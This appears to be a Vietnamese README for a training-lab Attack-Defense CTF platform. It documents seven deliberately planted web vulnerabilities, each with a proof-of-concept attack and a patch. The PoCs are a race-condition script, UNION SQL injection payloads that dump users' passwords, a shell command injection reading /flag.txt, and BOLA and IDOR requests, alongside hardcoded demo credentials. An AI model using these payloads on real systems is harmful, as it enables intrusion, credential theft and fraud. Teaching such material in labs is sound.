# Nền tảng CTF Tấn công - Phòng thủ (Attack-Defense) "Chợ Đen Số"

Dự án này là một nền tảng thực hành an toàn thông tin theo mô hình Attack-Defense hoàn chỉnh, lấy chủ đề **"Chợ Đen Số" (The Cyber Black Market)**. Hệ thống tích hợp sẵn cổng quản lý **Gitea** đóng vai trò hệ thống CI/CD thu nhỏ, giúp người chơi lập trình, sửa lỗi và tự động build/deploy bản vá (Defense) hoàn toàn qua Git mà không cần quyền SSH vào máy chủ.

---

## 1. Cấu trúc thư mục dự án

```text
├── docker-compose.yml           # File docker orchestration cho toàn bộ hệ thống
├── gameserver/                  # Component 1: Máy chủ quản lý và chấm điểm (Port 8000)
│   ├── app.py                   # Logic Gameserver (Round Manager, Leaderboard, Submission)
│   ├── Dockerfile
│   ├── requirements.txt
│   ├── sla_checker.py           # Công cụ tự động kiểm tra uptime/SLA của các đội chơi
│   └── templates/               # Giao diện Web HTML/Bootstrap của Gameserver
├── deploy-webhook/              # Thành phần tự động deploy khi người chơi push Git (Port 9000)
│   ├── app.py                   # Trình xử lý Gitea Webhook, kéo code mới và chạy docker compose build
│   ├── Dockerfile
│   └── requirements.txt
├── vuln-service/                # Thư mục mã nguồn mẫu gốc chứa 7 lỗi bảo mật
│   ├── app.py                   # Backend sàn giao dịch chứa các lỗ hổng
│   └── static/config.py.bak     # File backup lộ mật khẩu mặc định
├── teams/                       # Thư mục chứa bản sao làm việc thực tế của 2 đội
│   ├── team1-service/           # Code chạy thực tế của Đội 1 (được clone từ Gitea)
│   └── team2-service/           # Code chạy thực tế của Đội 2 (được clone từ Gitea)
└── gitea_setup.py               # Script tự động khởi tạo Gitea (User, Repo, Webhook, Template)
```

---

## 2. Hướng dẫn cài đặt và khởi động hệ thống (Cho Admin)

### Bước 1: Khởi động các container Docker
Chạy lệnh sau tại thư mục gốc dự án để dựng toàn bộ hệ thống (yêu cầu quyền root/sudo nếu user chưa thuộc group docker):
```bash
sudo docker compose up --build -d
```

### Bước 2: Chạy script cấu hình Gitea tự động
Khi hệ thống chạy lần đầu, Gitea sẽ trống rỗng. Hãy chạy script tự động hóa để khởi tạo tài khoản, kho lưu trữ và liên kết Webhook:
```bash
python3 gitea_setup.py
```
*Script này sẽ thực hiện:*
1. Tạo tài khoản admin cho Gitea.
2. Tạo tài khoản người chơi: `team1` (pass: `teampassword1`) và `team2` (pass: `teampassword2`).
3. Tạo repo `team1-service` và `team2-service`.
4. Đẩy mã nguồn mẫu `vuln-service` vào 2 repo trên.
5. Cấu hình Webhook gửi tín hiệu deploy sang `deploy-webhook:9000` mỗi khi có lệnh Git Push.
6. Thực hiện clone các repo này về thư mục `./teams/team1-service` và `./teams/team2-service` trên máy chủ.

### Bước 3: Kích hoạt giải đấu
Truy cập giao diện Admin của Gameserver để bắt đầu tính giờ các Round (2 phút/round) và chạy chấm điểm SLA:
- **Địa chỉ Admin Panel:** `http://[IP_SERVER]:8000/admin?secret=SuperSecretAdminKey1337!` (ví dụ: `http://192.168.29.157:8000/admin...`).
- Click **Start Game Engine**.

---

## 3. Quy trình tham gia trò chơi (Cho Đội chơi)

Giả sử bạn là thành viên **Team 1** sử dụng máy tính cá nhân để tham gia:

### Bước 1: Đăng nhập hệ thống Git
1. Truy cập trang Gitea tại: `http://192.168.29.157:3000`.
2. Đăng nhập bằng tài khoản được cấp:
   - **Username:** `team1`
   - **Password:** `teampassword1`

### Bước 2: Clone mã nguồn về máy cá nhân
Sao chép địa chỉ repository của đội mình và clone về máy cá nhân để làm việc:
```bash
git clone http://192.168.29.157:3000/git/team1/team1-service.git
cd team1-service
```

### Bước 3: Khai thác lỗi đối thủ (Attack)
Thực hiện tấn công vào dịch vụ của đối thủ (Team 2) đang chạy tại cổng `8002` (IP `192.168.29.157:8002`) dựa trên các lỗi bảo mật được mô tả ở mục 4 để lấy flag. 

Sau khi lấy được flag, truy cập Gameserver tại `http://192.168.29.157:8000`, đăng nhập tài khoản Đội (`team1`) và nộp flag tại mục **Submit Flags** để ghi điểm.

### Bước 4: Vá lỗi hệ thống nhà và Tự động Deploy (Defense)
1. Mở thư mục code `team1-service` đã clone ở Bước 2 bằng trình soạn thảo (ví dụ: VS Code).
2. Sửa lỗi bảo mật trong file `app.py` (ví dụ: chuyển các câu lệnh SQL nối chuỗi thành Parameterized Queries).
3. Đẩy code đã sửa lên Gitea:
   ```bash
   git add app.py
   git commit -m "Fix SQL Injection on Search feature"
   git push origin main
   ```
4. **Hệ thống CI/CD tự động hoạt động:**
   - Ngay khi nhận được lệnh push của bạn, Gitea sẽ phát tín hiệu Webhook tới container `deploy-webhook`.
   - `deploy-webhook` sẽ tự động chạy lệnh `git pull` để kéo code mới nhất về thư mục `./teams/team1-service` trên server.
   - Sau đó tự động chạy lệnh `docker compose build team1-service && docker compose up -d team1-service` để cập nhật dịch vụ trực tiếp trên máy chủ.
   - Bạn có thể vào mục **Service Monitor** trên Gameserver để kiểm tra trạng thái dịch vụ của mình (`UP`).

---

## 4. Chi tiết 7 lỗ hổng & Hướng dẫn Khai thác/Vá lỗi

### Lỗ hổng 1: Race Condition (Web/Business Logic)
* **Mô tả:** Endpoint rút tiền `/api/withdraw` thực hiện đọc số dư cũ, ngủ 0.5s giả lập xử lý chậm (`time.sleep(0.5)`), rồi ghi đè số dư mới mà không khóa luồng dữ liệu (Mutex/Database Lock).
* **Kịch bản khai thác (Attack):**
  Gửi cùng lúc nhiều request rút tiền (ví dụ: rút $50 khi tài khoản chỉ có $100). Nếu gửi đồng thời 10 request song song, cả 10 request đều đọc được số dư ban đầu là $100 trước khi bất kỳ lệnh ghi nào được thực hiện, giúp nhân bản số dư ảo lên nhiều lần.
  * *PoC Python script:*
    ```python
    import threading, requests
    url = "http://192.168.29.157:8002/api/withdraw"
    cookies = {"session_token": "[TOKEN_USER_CUA_BAN]"}
    
    def send_req():
        r = requests.post(url, data={"amount": "50"}, cookies=cookies)
        print(r.text)
        
    threads = [threading.Thread(target=send_req) for _ in range(5)]
    for t in threads: t.start()
    for t in threads: t.join()
    ```
* **Cách vá lỗi (Defense):**
  Sử dụng cơ chế khóa mutex (`threading.Lock`) trong Flask app để đảm bảo tại một thời điểm chỉ có duy nhất một request được thay đổi số dư của user.
  * *Mã nguồn vá lỗi:*
    ```python
    import threading
    db_lock = threading.Lock()
    
    # Trong hàm withdraw():
    with db_lock:
        # Thực hiện đọc balance, tính toán và ghi đè balance...
    ```

---

### Lỗ hổng 2: Insecure Direct Object References - IDOR (API)
* **Mô tả:** Endpoint `/api/message/<int:msg_id>` trả về nội dung của tin nhắn bảo mật mà không kiểm tra xem người yêu cầu có phải là người gửi hoặc người nhận hay không.
* **Kịch bản khai thác (Attack):**
  Lấy cookie session đăng nhập của bạn, sau đó thực hiện lặp qua các ID của tin nhắn từ `1` trở đi. Tin nhắn ID `1` luôn chứa DB Flag được chèn bởi Gameserver cho user `flag_holder`.
  * *PoC Lệnh curl:*
    ```bash
    curl -b "session_token=[TOKEN_CUA_BAN]" http://192.168.29.157:8002/api/message/1
    ```
* **Cách vá lỗi (Defense):**
  Trong hàm `get_message(msg_id)`, sau khi query tin nhắn từ Database, hãy kiểm tra xem trường `sender` hoặc `receiver` có trùng khớp với `user['username']` của session hiện tại hay không.
  * *Mã nguồn vá lỗi:*
    ```python
    if msg['sender'] != user['username'] and msg['receiver'] != user['username']:
        return jsonify({"status": "error", "message": "Unauthorized access to this message!"}), 403
    ```

---

### Lỗ hổng 3: SQL Injection (Database)
* **Mô tả:** Endpoint tìm kiếm `/search` nhận tham số đầu vào `q` và nối chuỗi trực tiếp vào câu lệnh truy vấn SQL: `f"SELECT * FROM items WHERE name LIKE '%{query}%' ..."`.
* **Kịch bản khai thác (Attack):**
  Sử dụng kỹ thuật UNION-based SQL Injection để trích xuất dữ liệu từ bảng `private_messages` (chứa flag).
  * *PoC payload trên thanh tìm kiếm:*
    ```text
    ' UNION SELECT 1, message, 3, 4, 5 FROM private_messages --
    ```
    Hoặc dump mật khẩu của toàn bộ user để chiếm quyền tài khoản:
    ```text
    ' UNION SELECT id, username, password, role, balance FROM users --
    ```
* **Cách vá lỗi (Defense):**
  Sử dụng câu lệnh SQL an toàn với tham số truyền vào (Parameterized query) thay vì nối chuỗi trực tiếp.
  * *Mã nguồn vá lỗi:*
    ```python
    # Thay vì nối chuỗi:
    # sql_query = f"SELECT * FROM items..."
    
    # Hãy dùng:
    cursor.execute("SELECT * FROM items WHERE name LIKE ? OR description LIKE ?", (f'%{query}%', f'%{query}%'))
    ```

---

### Lỗ hổng 4: Command Injection / RCE (System)
* **Mô tả:** Endpoint `/api/network_check` chạy câu lệnh ping qua hệ thống bằng `subprocess.check_output(command, shell=True)` mà không kiểm tra hay sanitize chuỗi đầu vào của tham số `target`.
* **Kịch bản khai thác (Attack):**
  Chèn thêm ký tự điều khiển luồng lệnh như `;`, `&&`, hoặc `|` vào tham số `target` để thực thi lệnh bất kỳ trên máy chủ, đọc flag từ tệp `/flag.txt`.
  * *PoC payload gửi POST:*
    ```bash
    curl -b "session_token=[TOKEN]" -d "target=127.0.0.1; cat /flag.txt" http://192.168.29.157:8002/api/network_check
    ```
* **Cách vá lỗi (Defense):**
  1. Kiểm tra đầu vào nghiêm ngặt bằng Regular Expression để chỉ cho phép ký tự là địa chỉ IP hoặc tên miền hợp lệ.
  2. Hoặc không sử dụng `shell=True` mà chạy lệnh dạng mảng đối số an toàn.
  * *Mã nguồn vá lỗi:*
    ```python
    import re
    # Kiểm tra chỉ cho phép chữ cái, chữ số, dấu chấm, dấu gạch ngang
    if not re.match(r"^[a-zA-Z0-9.-]+$", target):
        return jsonify({"status": "error", "message": "Invalid character in target IP!"}), 400
    ```

---

### Lỗ hổng 5: Broken Object Level Authorization - BOLA (API)
* **Mô tả:** Endpoint cập nhật thông tin `/api/profile/update` nhận JSON payload và tin tưởng trực tiếp vào thuộc tính `username` gửi lên từ client thay vì lấy thông tin từ token xác thực. Ngoài ra nó cho phép sửa trường `role` và `balance` của bất kỳ ai.
* **Kịch bản khai thác (Attack):**
  Đăng nhập bằng một tài khoản thường, sau đó gửi một POST request chứa JSON payload để cập nhật quyền hạn hoặc tài khoản của đối tượng khác sang `admin`.
  * *PoC Payload gửi POST:*
    ```bash
    curl -X POST -H "Content-Type: application/json" -b "session_token=[TOKEN_CUA_BAN]" \
      -d '{"username": "[TEN_USER_CUA_BAN]", "role": "admin", "balance": 99999}' \
      http://192.168.29.157:8002/api/profile/update
    ```
* **Cách vá lỗi (Defense):**
  1. Buộc cập nhật profile dựa trên thông tin định danh `user['username']` giải mã từ session token, không sử dụng thuộc tính `username` do Client gửi lên trong body.
  2. Chặn không cho phép cập nhật các thuộc tính nhạy cảm như `role` hoặc `balance` ngoại trừ các trường hợp được quyền của Admin hoặc cơ chế thanh toán hợp lệ.
  * *Mã nguồn vá lỗi:*
    ```python
    # Lấy username cố định từ Token giải mã
    username_to_update = user['username'] 
    
    # Không cho phép tự ý nâng role hoặc balance
    if 'role' in data or 'balance' in data:
        return jsonify({"status": "error", "message": "Modifying restricted fields is forbidden!"}), 403
    ```

---

### Lỗ hổng 6: Weak Cryptography (Crypto)
* **Mô tả:** Tính năng nhận coupon thưởng `/api/coupon/claim` kiểm tra mã coupon bằng thuật toán băm yếu: `md5(username + "WEAK_SALT")`. Trong đó Salt được đặt cố định là `WEAK_SALT`.
* **Kịch bản khai thác (Attack):**
  Xem mã nguồn/thông tin rò rỉ để biết thuật toán và giá trị Salt. Sau đó tự tính toán mã MD5 cho tài khoản của bạn để nhận $500 balance miễn phí.
  * *Cách tính mã coupon cho tài khoản `bob`:*
    `bobWEAK_SALT` -> Băm MD5 -> `9ee08316c024ddf5e3ba0c634c03848b`.
  * *PoC Lệnh curl:*
    ```bash
    curl -b "session_token=[TOKEN_BOB]" -d "coupon_code=9ee08316c024ddf5e3ba0c634c03848b" http://192.168.29.157:8002/api/coupon/claim
    ```
* **Cách vá lỗi (Defense):**
  Sử dụng thuật toán sinh token mạnh hơn với Salt ngẫu nhiên phức tạp được lưu trữ an toàn, hoặc dùng mã ký HMAC-SHA256 với secret mạnh được lưu trong biến môi trường không lộ ra ngoài.
  * *Mã nguồn vá lỗi:*
    ```python
    # Sử dụng khóa bí mật mạnh để băm hoặc kiểm tra chống giả mạo
    import hmac
    SECRET_KEY = b"StrongRandomServerSideKey2026!!!"
    expected_hash = hmac.new(SECRET_KEY, user['username'].encode(), hashlib.sha256).hexdigest()
    ```

---

### Lỗ hổng 7: Hardcoded Credentials / Information Disclosure (Information Disclosure)
* **Mô tả:** Có một file backup cấu hình `/static/config.py.bak` nằm công khai trong thư mục static chứa các mật khẩu admin mặc định và JWT Secret Key yếu (`VulnServiceDefaultWeakSecretKey`).
* **Kịch bản khai thác (Attack):**
  Truy cập thẳng vào đường dẫn file backup để đọc toàn bộ dữ liệu cấu hình nhạy cảm. Từ đó lấy được mật khẩu admin hoặc dùng JWT Secret Key bẻ khóa ký giả mạo token nâng quyền truy cập.
  * *PoC URL:*
    [http://192.168.29.157:8002/static/config.py.bak](http://192.168.29.157:8002/static/config.py.bak)
* **Cách vá lỗi (Defense):**
  Xóa bỏ tệp tin `.bak` nhạy cảm này khỏi thư mục static hoặc cấu hình chặn truy cập trực tiếp các tệp tin có đuôi mở rộng dạng này trong Flask/Nginx. Thay đổi JWT Secret Key mặc định thành một khóa mạnh được tạo ngẫu nhiên lúc runtime.
  * *Mã nguồn vá lỗi:*
    Xóa file: `rm vuln-service/static/config.py.bak`
    Và sinh ngẫu nhiên khóa session trong `app.py`:
    ```python
    import os
    JWT_SECRET_KEY = os.urandom(32).hex() # Sinh khóa mạnh ngẫu nhiên mỗi lần chạy
    ```
